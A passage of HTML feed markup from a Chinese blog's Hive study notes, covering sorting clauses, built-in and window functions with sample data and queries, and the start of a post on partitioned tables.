id="4-1-全局排序（Order-By）"><a href="#4-1-全局排序（Order-By）" class="headerlink" title="4.1 全局排序（Order By）"></a>4.1 全局排序（Order By）</h3><p>Order By：<strong>全局排序</strong>，只有一个Reducer</p><p>例如：查询员工信息按工资升序排列</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from emp order by sal<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-2-每个Reduce内部排序（Sort-By）"><a href="#4-2-每个Reduce内部排序（Sort-By）" class="headerlink" title="4.2 每个Reduce内部排序（Sort By）"></a>4.2 每个Reduce内部排序（Sort By）</h3><p>Sort By：对于大规模的数据集order by的效率非常低。在很多情况下，并不需要全局排序，此时可以使用sort by。</p><p><strong>Sort by为每个reducer产生一个排序文件（即为分区内的排序）。每个Reducer内部进行排序，对全局结果集来说不是排序</strong>。</p><p>1）设置reduce个数</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> mapreduce.job.reduces<span class="token operator">=</span>3<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2）查看设置reduce个数</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> mapreduce.job.reduces<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）根据部门编号降序查看员工信息</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from emp <span class="token function">sort</span> by deptno desc<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4）将查询结果导入到文件中（按照部门编号降序排序）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert overwrite local directory <span class="token string">'/opt/module/hive/datas/sortby-result'</span> <span class="token keyword">select</span> * from emp <span class="token function">sort</span> by deptno desc<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-3-分区（Distribute-By）"><a href="#4-3-分区（Distribute-By）" class="headerlink" title="4.3 分区（Distribute By）"></a>4.3 分区（Distribute By）</h3><p>Distribute By： 在有些情况下，我们需要控制某个特定行应该到哪个reducer，通常是为了进行后续的聚集操作。<strong>distribute by</strong> 子句可以做这件事。<strong>distribute by</strong>类似MR中partition（自定义分区），进行分区，结合sort by使用。 </p><p>对于distribute by进行测试，一定要分配多reduce进行处理，否则无法看到distribute by的效果。</p><p>1）案例实操：</p><p>（1）先按照部门编号分区，再按照员工编号降序排序。</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">set</span> mapreduce.job.reduces<span class="token operator">=</span>3<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> insert overwrite local directory <span class="token string">'/opt/module/hive/datas/distribute-result'</span> <span class="token keyword">select</span> * from emp distribute by deptno <span class="token function">sort</span> by empno desc<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意：</p><p>Ø distribute by的分区规则是根据分区字段的hash码与reduce的个数进行模除后，余数相同的分到一个区。</p><p>Ø Hive要求DISTRIBUTE BY语句要写在SORT BY语句之前。</p><h3 id="4-4-Cluster-By"><a href="#4-4-Cluster-By" class="headerlink" title="4.4 Cluster By"></a>4.4 Cluster By</h3><p>当distribute by和sort by字段相同时，可以使用cluster by方式。</p><p>cluster by除了具有distribute by的功能外还兼具sort by的功能。但是排序只能是升序排序，不能指定排序规则为ASC或者DESC。</p><p>（1）以下两种写法等价</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from emp cluster by deptno<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from emp distribute by deptno <span class="token function">sort</span> by deptno<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意：按照部门编号分区，不一定就是固定死的数值，可以是20号和30号部门分到一个分区里面去。</p><h1 id="5-函数使用"><a href="#5-函数使用" class="headerlink" title="5 函数使用"></a>5 函数使用</h1><h2 id="5-1-系统内置函数"><a href="#5-1-系统内置函数" class="headerlink" title="5.1 系统内置函数"></a>5.1 系统内置函数</h2><p>1）查看系统自带的函数</p><pre><code>hive&gt; show functions;</code></pre><p>2）显示自带的函数的用法</p><pre><code>hive&gt; desc function upper;</code></pre><p>3）详细显示自带的函数的用法</p><pre><code>hive&gt; desc function extended upper;</code></pre><h2 id="5-2-常用内置函数"><a href="#5-2-常用内置函数" class="headerlink" title="5.2 常用内置函数"></a>5.2 常用内置函数</h2><h3 id="5-2-1-空字段赋值"><a href="#5-2-1-空字段赋值" class="headerlink" title="5.2.1 空字段赋值"></a>5.2.1 空字段赋值</h3><p>1）函数说明</p><p>NVL：给值为NULL的数据赋值，它的格式是NVL( value，default_value)。它的功能是如果value为NULL，则NVL函数返回default_value的值，否则返回value的值，如果两个参数都为NULL ，则返回NULL。</p><p>2）数据准备：采用员工表</p><p>3）查询：如果员工的comm为NULL，则用-1代替</p><pre><code>hive (default)&gt; select comm,nvl(comm, -1) from emp;</code></pre><h3 id="5-2-2-CASE-WHEN-THEN-ELSE-END"><a href="#5-2-2-CASE-WHEN-THEN-ELSE-END" class="headerlink" title="5.2.2 CASE WHEN THEN ELSE END"></a>5.2.2 CASE WHEN THEN ELSE END</h3><p>1）数据准备</p><table><thead><tr><th>name</th><th>dept_id</th><th>sex</th></tr></thead><tbody><tr><td>悟空</td><td>A</td><td>男</td></tr><tr><td>大海</td><td>A</td><td>男</td></tr><tr><td>宋宋</td><td>B</td><td>男</td></tr><tr><td>凤姐</td><td>A</td><td>女</td></tr><tr><td>婷姐</td><td>B</td><td>女</td></tr><tr><td>婷婷</td><td>B</td><td>女</td></tr></tbody></table><p>2）需求</p><p>求出不同部门男女各多少人。结果如下：</p><p>dept_Id   男    女</p><p>A      2    1</p><p>B      1    2</p><p>3）按需求查询数据</p><p>select </p><pre><code> dept_id, sum(case sex when &#39;男&#39; then 1 else 0 end) male_count, sum(case sex when &#39;女&#39; then 1 else 0 end) female_countfrom  emp_sexgroup by dept_id;</code></pre><h3 id="5-2-3-行转列"><a href="#5-2-3-行转列" class="headerlink" title="5.2.3 行转列"></a>5.2.3 行转列</h3><p>1）相关函数说明</p><p><strong>CONCAT</strong>(string A/col, string B/col…)：返回输入字符串连接后的结果，支持任意个输入字符串;</p><p><strong>CONCAT_WS</strong>(separator, str1, str2,…)：它是一个特殊形式的 CONCAT()。第一个参数剩余参数间的分隔符。分隔符可以是与剩余参数一样的字符串。如果分隔符是 NULL，返回值也将为 NULL。这个函数会跳过分隔符参数后的任何 NULL 和空字符串。分隔符将被加到被连接的字符串之间;</p><p>注意: CONCAT_WS must be “string or array<string></string></p><p><strong>COLLECT_SET</strong>(col)：函数只接受基本数据类型，它的主要作用是将某字段的值进行去重汇总，产生array类型字段。</p><p><strong>COLLECT_list</strong>(col): 相比COLLECT_SET就是不去重的操作。</p><p>2）数据准备</p><table><thead><tr><th>name</th><th>constellation</th><th>blood_type</th></tr></thead><tbody><tr><td>孙悟空</td><td>白羊座</td><td>A</td></tr><tr><td>大海</td><td>射手座</td><td>A</td></tr><tr><td>宋宋</td><td>白羊座</td><td>B</td></tr><tr><td>猪八戒</td><td>白羊座</td><td>A</td></tr><tr><td>凤姐</td><td>射手座</td><td>A</td></tr><tr><td>苍老师</td><td>白羊座</td><td>B</td></tr></tbody></table><p>3）需求</p><p>把星座和血型一样的人归类到一起。结果如下：</p><pre><code>射手座,A      大海|凤姐白羊座,A      孙悟空|猪八戒白羊座,B       宋宋|苍老师</code></pre><p>4）创建本地constellation.txt，导入数据</p><pre><code>[molly@hadoop102 datas]$ vim person_info.txt孙悟空  白羊座  A大海 射手座  A宋宋 白羊座  B猪八戒  白羊座  A凤姐 射手座  A苍老师  白羊座  B</code></pre><p>5）创建hive表并导入数据</p><pre><code>create table person_info(name string, constellation string, blood_type string) row format delimited fields terminated by &quot;\t&quot;;load data local inpath &quot;/opt/module/hive/datas/person_info.txt&quot; into table person_info;</code></pre><p>6）按需求查询数据</p><pre><code>SELECT t1.c_b , CONCAT_WS(&quot;|&quot;,collect_set(t1.name))FROM (SELECT NAME ,CONCAT_WS(&#39;,&#39;,constellation,blood_type) c_bFROM person_info)t1 GROUP BY t1.c_b</code></pre><h3 id="5-2-4-列转行"><a href="#5-2-4-列转行" class="headerlink" title="5.2.4 列转行"></a>5.2.4 列转行</h3><p>1）函数说明</p><p>**EXPLODE(col)**：将hive一列中复杂的array或者map结构拆分成多行。</p><p><strong>LATERAL VIEW</strong>（侧写表）</p><p>用法：LATERAL VIEW udtf(expression) tableAlias AS columnAlias</p><p>解释：用于和split, explode等UDTF一起使用，它能够将一列数据拆成多行数据，在此基础上可以对拆分后的数据进行聚合。</p><p>2）数据准备</p><p>表6-7 数据准备</p><table><thead><tr><th>movie</th><th>category</th></tr></thead><tbody><tr><td>《疑犯追踪》</td><td>悬疑,动作,科幻,剧情</td></tr><tr><td>《Lie to me》</td><td>悬疑,警匪,动作,心理,剧情</td></tr><tr><td>《战狼2》</td><td>战争,动作,灾难</td></tr></tbody></table><p>3）需求</p><p>将电影分类中的数组数据展开。结果如下：</p><pre><code>《疑犯追踪》   悬疑《疑犯追踪》   动作《疑犯追踪》   科幻《疑犯追踪》   剧情《Lie to me》  悬疑《Lie to me》  警匪《Lie to me》  动作《Lie to me》  心理《Lie to me》  剧情《战狼2》     战争《战狼2》     动作《战狼2》     灾难</code></pre><p>4）创建本地movie.txt，导入数据</p><pre><code>[molly@hadoop102 datas]$ vi movie_info.txt《疑犯追踪》 悬疑,动作,科幻,剧情《Lie to me》 悬疑,警匪,动作,心理,剧情《战狼2》 战争,动作,灾难</code></pre><p>5）创建hive表并导入数据</p><pre><code>create table movie_info(  movie string,   category string) row format delimited fields terminated by &quot;\t&quot;;load data local inpath &quot;/opt/module/hive/datas/movie_info.txt&quot; into table movie_info;</code></pre><p>6）按需求查询数据</p><pre><code>SELECT movie,category_name FROM movie_info lateral VIEWexplode(split(category,&quot;,&quot;)) movie_info_tmp AS category_name ;</code></pre><h3 id="5-2-5-窗口函数（开窗函数）"><a href="#5-2-5-窗口函数（开窗函数）" class="headerlink" title="5.2.5 窗口函数（开窗函数）"></a>5.2.5 窗口函数（开窗函数）</h3><p>1）相关函数说明</p><p>**OVER()**：指定分析函数工作的数据窗口大小，这个数据窗口大小可能会随着行的改变而变化。涉及关键字如下</p><table><thead><tr><th>CURRENT ROW</th><th>当前行</th></tr></thead><tbody><tr><td>n PRECEDING</td><td>往前n行数据</td></tr><tr><td>n FOLLOWING</td><td>往后n行数据</td></tr><tr><td>UNBOUNDED</td><td>起点</td></tr><tr><td>UNBOUNDED PRECEDING</td><td>表示从前面的起点</td></tr><tr><td>UNBOUNDED FOLLOWING</td><td>表示到后面的终点</td></tr><tr><td>LAG(col,n,default_val)</td><td>往前第n行数据</td></tr><tr><td>LEAD(col,n, default_val)</td><td>往后第n行数据</td></tr><tr><td>NTILE(n)</td><td>把有序窗口的行分发到指定数据的组中，各个组有编号，编号从1开始，对于每一行，NTILE返回此行所属的组的编号。注意：n必须为int类型</td></tr></tbody></table><p><strong>总结如下：</strong></p><p><strong>OVER()</strong> 默认为每条数据都开一个窗口，窗口大小是当前数据集的大小。</p><p><strong>OVER(partition by…. )</strong> 会按照指定字段进行分区，将分区字段的值仙童的数据划分到相同的区；每个区中的每条数据都会开启一个窗口，每条数据的窗口大小默认为当前分区数据的大小。</p><p><strong>OVER(order by …)</strong> 会在窗口中按照指定的字段对数据进行排序，会为每条数据都开启一个窗口，默认窗口大小为从数据集开始到当前行。</p><p>**OVER(partition by …order by..)**：会按照指定的字段进行分区，将分区字段的值仙童的数据划分到相同的区，在每个区会按照指定字段进行排序；每个区中的每条数据都会开启一个窗口，每条数据的窗口大小默认为当前分区中从数据集开始到当前行。相当于：partition by name order by orderdate rows between UNBOUNDED PRECEDING and current row</p><p><strong>关键字总结</strong></p><table><thead><tr><th>Order by</th><th>全局排序；窗口函数中排序</th></tr></thead><tbody><tr><td>Distribute by</td><td>分区</td></tr><tr><td>Sort by</td><td>区内排序</td></tr><tr><td>Cluster by</td><td>分区排序</td></tr><tr><td>Partition by</td><td>窗口函数中分区</td></tr><tr><td>Partitioned by</td><td>建表 指定分区字段</td></tr><tr><td>Clustered by</td><td>建表 指定分桶字段</td></tr></tbody></table><p><strong>注意partition by …order by组合；Distribute by和Sort by 组合使用</strong></p><p>2）数据准备：name，orderdate，cost</p><pre class="line-numbers language-sh"><code class="language-sh">jack,2017-01-01,10tony,2017-01-02,15jack,2017-02-03,23tony,2017-01-04,29jack,2017-01-05,46jack,2017-04-06,42tony,2017-01-07,50jack,2017-01-08,55mart,2017-04-08,62mart,2017-04-09,68neil,2017-05-10,12mart,2017-04-11,75neil,2017-06-12,80mart,2017-04-13,94<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）需求</p><p>（1）查询在2017年4月份购买过的顾客及总人数</p><p>（2）查询顾客的购买明细及月购买总额</p><p>（3）上述的场景, 将每个顾客的cost按照日期进行累加</p><p>（4）查询每个顾客上次的购买时间</p><p>（5）查询前20%时间的订单信息</p><p>4）创建本地business.txt，导入数据</p><pre><code>[molly@hadoop102 datas]$ vi business.txt</code></pre><p>5）创建hive表并导入数据</p><pre><code>create table business(name string, orderdate string,cost int) ROW FORMAT DELIMITED FIELDS TERMINATED BY &#39;,&#39;;load data local inpath &quot;/opt/module/hive/datas/business.txt&quot; into table business;</code></pre><p>6）按需求查询数据</p><p>（1）      查询在2017年4月份购买过的顾客及总人数</p><pre><code>select name,count(*) over () from business where substring(orderdate,1,7) = &#39;2017-04&#39; group by name;</code></pre><p>（2）      查询顾客的购买明细及所有顾客的月购买总额</p><p>使用分区：按照每个月做分区</p><pre><code>sum(cost) over(partition by month(orderdate))：表示对某个月的所有顾客的购买总额求sum；当前over的窗口大小是分区大小。select name,orderdate,cost,sum(cost) over(partition by month(orderdate)) frombusiness;</code></pre><p>（3）      将每个顾客的cost按照日期进行累加</p><pre><code>select name,orderdate,cost, sum(cost) over() as sample1,--所有行相加 sum(cost) over(partition by name) as sample2,--按name分组，组内数据相加 sum(cost) over(partition by name order by orderdate) as sample3,--按name分组，组内数据累加 </code></pre><p>rows必须跟在Order by 子句之后，对排序的结果进行限制，使用固定的行数来限制分区中的数据行数量</p><p>sample3的执行结果如下：</p><p>​                                <img src="/2020/11/15/bigdata-hive2/1637036085261.png" alt="1637036085261"></p><p><strong>拓展：数据窗口大小变化</strong></p><pre><code>sum(cost) over(partition by name order by orderdate rows between UNBOUNDED PRECEDING and current row ) as sample4 ,--和sample3一样,由起点到当前行的聚合 sum(cost) over(partition by name order by orderdate rows between 1 PRECEDING and current row) as sample5, --当前行和前面一行做聚合 sum(cost) over(partition by name order by orderdate rows between 1 PRECEDING AND 1 FOLLOWING ) as sample6,--当前行和前边一行及后面一行 sum(cost) over(partition by name order by orderdate rows between current row and UNBOUNDED FOLLOWING ) as sample7 --当前行及后面所有行 from business;</code></pre><p> （4）      查看顾客上次的购买时间和下一次购买时间：使用lag和lead函数</p><pre><code>select name,orderdate,cost, lag(orderdate,1,&#39;1900-01-01&#39;) over(partition by name order by orderdate ) as p_ orderdate, lead(orderdate,1,&#39;9999-01-01&#39;) over (partition by name order by orderdate) as p_ orderdatefrom business;</code></pre><p>​                  <img src="/2020/11/15/bigdata-hive2/1637036128510.png" alt="1637036128510"></p><p>（5）      查询前20%时间的订单信息，使用NTILE函数进行分组。按照时间排序分成5组，取第一个组，即前20%</p><pre><code>select * from (  select name,orderdate,cost, ntile(5) over(order by orderdate) gid   from business) twhere t. gid = 1;</code></pre><p>​                      <img src="/2020/11/15/bigdata-hive2/1637036162813.png" alt="1637036162813">  </p><h3 id="5-2-6-Rank"><a href="#5-2-6-Rank" class="headerlink" title="5.2.6 Rank"></a>5.2.6 Rank</h3><p>1）函数说明</p><p><strong>RANK() 排序相同时会重复，总数不会变</strong></p><p><strong>DENSE_RANK() 排序相同时会重复，总数会减少</strong></p><p><strong>ROW_NUMBER() 会根据顺序计算</strong></p><p>2）数据准备</p><table><thead><tr><th>name</th><th>subject</th><th>score</th></tr></thead><tbody><tr><td>孙悟空</td><td>语文</td><td>87</td></tr><tr><td>孙悟空</td><td>数学</td><td>95</td></tr><tr><td>孙悟空</td><td>英语</td><td>68</td></tr><tr><td>大海</td><td>语文</td><td>94</td></tr><tr><td>大海</td><td>数学</td><td>56</td></tr><tr><td>大海</td><td>英语</td><td>84</td></tr><tr><td>宋宋</td><td>语文</td><td>64</td></tr><tr><td>宋宋</td><td>数学</td><td>86</td></tr><tr><td>宋宋</td><td>英语</td><td>84</td></tr><tr><td>婷婷</td><td>语文</td><td>65</td></tr><tr><td>婷婷</td><td>数学</td><td>85</td></tr><tr><td>婷婷</td><td>英语</td><td>78</td></tr></tbody></table><p>3）需求</p><p>计算每门学科成绩排名。</p><p>4）创建本地score.txt，导入数据</p><pre><code>[molly@hadoop102 datas]$ vi score.txt</code></pre><p>5）创建hive表并导入数据</p><pre><code>create table score(name string,subject string, score int) row format delimited fields terminated by &quot;\t&quot;;load data local inpath &#39;/opt/module/hive/datas/score.txt&#39; into table score;</code></pre><p>6）按需求查询数据</p><pre><code>select name,subject,score,rank() over(partition by subject order by score desc) rp,dense_rank() over(partition by subject order by score desc) drp,row_number() over(partition by subject order by score desc) rmpfrom score;</code></pre><p>查询结果如下面所示：</p><pre><code>name  subject score  rp   drp   rmp孙悟空 数学  95   1    1    1宋宋  数学  86   2    2    2婷婷  数学  85   3    3    3大海  数学  56   4    4    4宋宋  英语  84   1    1    1大海  英语  84   1    1    2婷婷  英语  78   3    2    3孙悟空 英语  68   4    3    4大海  语文  94   1    1    1孙悟空 语文  87   2    2    2婷婷  语文  65   3    3    3宋宋  语文  64   4    4    4</code></pre>]]></content:encoded>
      
      
      <category domain="https://m01ly.github.io/categories/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%BC%80%E5%8F%91/">大数据开发</category>
      
      
      <category domain="https://m01ly.github.io/tags/Hive/">Hive</category>
      
      
      <comments>https://m01ly.github.io/2020/11/15/bigdata-hive2/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Hive学习笔记（三） Hive的分区表和分桶表</title>
      <link>https://m01ly.github.io/2020/11/15/bigdata-hive3/</link>
      <guid>https://m01ly.github.io/2020/11/15/bigdata-hive3/</guid>
      <pubDate>Sun, 15 Nov 2020 07:45:51 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在查找大数据的时候，检索是通过检索所有数据，效率很慢，因此合理规划数据的存储尤其重要，例如可以根据日期进行分区存储（即分目录去存储）,或者使用分桶去切分数据文件进行存储。（注意这里说的分区和上篇的查找排序分区是不同的概念，上面的排序分区是存储好了去查找；这里的分区表是指在怎么分区去存储）</p><h1 id="1-分区表"><a href="#1-分区表" class="headerlink" title="1  分区表"></a>1  分区表</h1><p>分区表实际上就是对应一个HDFS文件系统上的独立的文件夹，该文件夹下是该分区所有的数据文件。<strong>Hive中的分区就是分目录，把一个大的数据集根据业务需要分割成小的数据集</strong>。在查询时通过WHERE子句中的表达式选择查询所需要的指定的分区，这样的查询效率会提高很多。</p><h2 id="1-1-分区表基本操作"><a href="#1-1-分区表基本操作" class="headerlink" title="1.1 分区表基本操作"></a>1.1 分区表基本操作</h2><p>1）引入分区表（需要根据日期对日志进行管理, 通过部门信息模拟）</p><pre><code>dept_20200401.logdept_20200402.logdept_20200403.log……</code></pre><p>2）创建分区表语法：通过partitioned去指定根据day字段去进行分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create table dept_partition<span class="token punctuation">(</span>deptno int, dname string, loc string<span class="token punctuation">)</span>partitioned by <span class="token punctuation">(</span>day string<span class="token punctuation">)</span>row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）加载数据到分区表中</p><p>（1）      数据准备</p><pre class="line-numbers language-bash"><code class="language-bash">dept_20200401.log10 ACCOUNTING 170020 RESEARCH  1800dept_20200402.log30 SALES  190040 OPERATIONS 1700dept_20200403.log50 TEST  200060 DEV 1900<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）      加载数据-通过dept_partition partition(day=’20200402’)去指定导入的具体分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/hive/datas/dept_20200401.log'</span> into table dept_partition partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200401'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module/hive/datas/dept_20200402.log'</span> into table dept_partition partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200402'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>注意：分区表加载数据时，必须指定分区</p><p> Hdfs中文件如下：</p><p><img src="/2020/11/15/bigdata-hive3/1636982808531.png" alt="1636982808531"></p><p>4）查询分区表中数据</p><p>单分区查询-根据day去筛选</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition where day<span class="token operator">=</span><span class="token string">'20200401'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>多分区联合查询</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition where day<span class="token operator">=</span><span class="token string">'20200401'</span>​       union​       <span class="token keyword">select</span> * from dept_partition where day<span class="token operator">=</span><span class="token string">'20200402'</span>​       union​       <span class="token keyword">select</span> * from dept_partition where day<span class="token operator">=</span><span class="token string">'20200403'</span><span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition where day<span class="token operator">=</span><span class="token string">'20200401'</span> or​        day<span class="token operator">=</span><span class="token string">'20200402'</span> or day<span class="token operator">=</span><span class="token string">'20200403'</span> <span class="token punctuation">;</span>      <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>5）增加分区</p><p>创建单个分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept_partition add partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200404'</span><span class="token punctuation">)</span> <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同时创建多个分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept_partition add partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200405'</span><span class="token punctuation">)</span> partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200406'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>6）删除分区</p><p>删除单个分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept_partition drop partition <span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200406'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同时删除多个分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> alter table dept_partition drop partition <span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200404'</span><span class="token punctuation">)</span>, partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200405'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>7）查看分区表有多少分区</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> show partitions dept_partition<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>8）查看分区表结构</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> desc formatted dept_partition<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-2-二级分区"><a href="#1-2-二级分区" class="headerlink" title="1.2 二级分区"></a>1.2 二级分区</h3><p>思考: 如何一天的日志数据量也很大，如何再将数据拆分?</p><p>1）创建二级分区表</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> create table dept_partition2<span class="token punctuation">(</span>               deptno int, dname string, loc string               <span class="token punctuation">)</span>               partitioned by <span class="token punctuation">(</span>day string, hour string<span class="token punctuation">)</span>               row <span class="token function">format</span> delimited fields terminated by <span class="token string">'\t'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  2）正常的加载数据</p><p>（1）加载数据到二级分区表中</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> load data local inpath <span class="token string">'/opt/module`/hive/datas/dept_20200401.log'</span> into table dept_partition2 partition<span class="token punctuation">(</span>day<span class="token operator">=</span><span class="token string">'20200401'</span>, hour<span class="token operator">=</span><span class="token string">'12'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）查询分区数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition2 where day<span class="token operator">=</span><span class="token string">'20200401'</span> and hour<span class="token operator">=</span><span class="token string">'12'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3）把数据直接上传到分区目录上，让分区表和数据产生关联的三种方式</p><p>（1）方式一：先上传数据，然后进行修复分区操作，可以查到数据</p><p>上传数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -mkdir -p /user/hive/warehouse/mydb.db/dept_partition2/day<span class="token operator">=</span>20200401/hour<span class="token operator">=</span>13<span class="token punctuation">;</span>hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -put /opt/module/datas/dept_20200401.log /user/hive/warehouse/mydb.db/dept_partition2/day<span class="token operator">=</span>20200401/hour<span class="token operator">=</span>13<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查询数据（查询不到刚上传的数据）</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition2 where day<span class="token operator">=</span><span class="token string">'20200401'</span> and hour<span class="token operator">=</span><span class="token string">'13'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行分区修复命令</p><pre class="line-numbers language-bash"><code class="language-bash">hive<span class="token operator">></span> msck repair table dept_partition2<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再次查询数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">select</span> * from dept_partition2 where day<span class="token operator">=</span><span class="token string">'20200401'</span> and hour<span class="token operator">=</span><span class="token string">'13'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）方式二：上传数据后，手动添加分区</p><p>上传数据</p><pre class="line-numbers language-bash"><code class="language-bash">hive <span class="token punctuation">(</span>default<span class="token punctuation">)</span><span class="token operator">></span> dfs -mkdir -p /user/hive/warehouse/mydb.db/dept_partition2/day<span class="token operator">=</span>20200401/hour<span class="token operator">=</span>14<span class="token punctuation">;</span>hive <span class="token 